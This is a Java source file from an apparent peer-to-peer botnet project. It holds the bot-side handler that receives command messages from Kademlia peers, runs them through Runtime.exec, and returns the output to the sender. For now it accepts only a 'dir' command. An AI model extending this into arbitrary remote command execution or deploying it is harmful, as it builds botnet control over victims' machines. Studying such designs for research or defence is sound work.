package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.p2p_layer.P2pLayer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.util.IOUtils;

import java.io.IOException;
import java.io.InputStreamReader;

import static botnet_p2p.MessageOuterClass.Message;


class BotMessageHandler {
    private static final Logger logger = LogManager.getLogger(BusinessLogicLayer.class);
    private P2pLayer p2pLayer;
    private KademliaPeer me;

    BotMessageHandler(P2pLayer p2pLayer, KademliaPeer me) {
        this.p2pLayer = p2pLayer;
        this.me = me;
    }

    public BotMessageHandler() {
    }

    void handleCommandMessage(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
        String command = message.getCommand().getCommandString();

        logger.info("executing command: " + command);
        String result = executeCommand(command);
        boolean success = true;
        if(result == null) {
            result = "";
            success = false;
        }
        p2pLayer.commandResponse(sender, me, result, success);
    }

    String executeCommand(String command) {
        if ("dir".equals(command)) {
            try {
                Process exec = Runtime.getRuntime().exec("cmd /c dir");
                exec.waitFor();
                if(exec.exitValue() != 0) {
                    return null;
                }
                InputStreamReader i = new InputStreamReader(exec.getInputStream());
                return IOUtils.toString(i);
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
                return null;
            }
        }
        return null;
    }


}
